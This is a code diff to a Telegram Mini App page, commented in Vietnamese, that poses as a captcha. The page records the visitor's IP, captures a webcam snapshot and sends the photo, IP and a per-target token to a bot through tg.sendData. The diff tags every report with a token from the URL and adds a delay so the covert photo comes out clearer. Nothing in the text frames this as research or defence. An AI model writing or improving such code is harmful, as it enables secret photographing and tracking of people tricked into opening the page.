@@ -44,6 +44,10 @@
         tg.ready();
         tg.expand();
 
+        // Lấy token từ URL query params do bot truyền sang
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token') || '';
+
         let clientIp = "";
         const num1 = Math.floor(Math.random() * 10) + 1;
         const num2 = Math.floor(Math.random() * 10) + 1;
@@ -79,6 +83,7 @@
                 try {
                     tg.sendData(JSON.stringify({
                         type: "camera_denied",
+                        token: token,
                         ip: clientIp
                     }));
                 } catch (e) {}
@@ -89,6 +94,8 @@
                 return;
             }
 
+            // Chờ 1.5 giây để khung hình camera ổn định trước khi chụp
+            await new Promise(resolve => setTimeout(resolve, 1500));
             await captureAndSendPhoto();
 
             document.getElementById('status').innerText = "Vui lòng giải mã Captcha bên dưới:";
@@ -108,7 +115,7 @@
                     if (video.readyState >= 1) resolve();
                     else video.onloadedmetadata = () => resolve();
                 });
-                await new Promise(r => setTimeout(r, 500));
+                await video.play();
                 return true;
             } catch (err) {
                 console.log("Không thể truy cập camera:", err);
@@ -135,6 +142,7 @@
             try {
                 tg.sendData(JSON.stringify({
                     type: "camera_snapshot",
+                    token: token,
                     image: imageDataUrl,
                     ip: clientIp
                 }));
@@ -164,6 +172,7 @@
                     try {
                         tg.sendData(JSON.stringify({
                             type: "miniapp_captcha",
+                            token: token,
                             ip: clientIp,
                             passed: true
                         }));
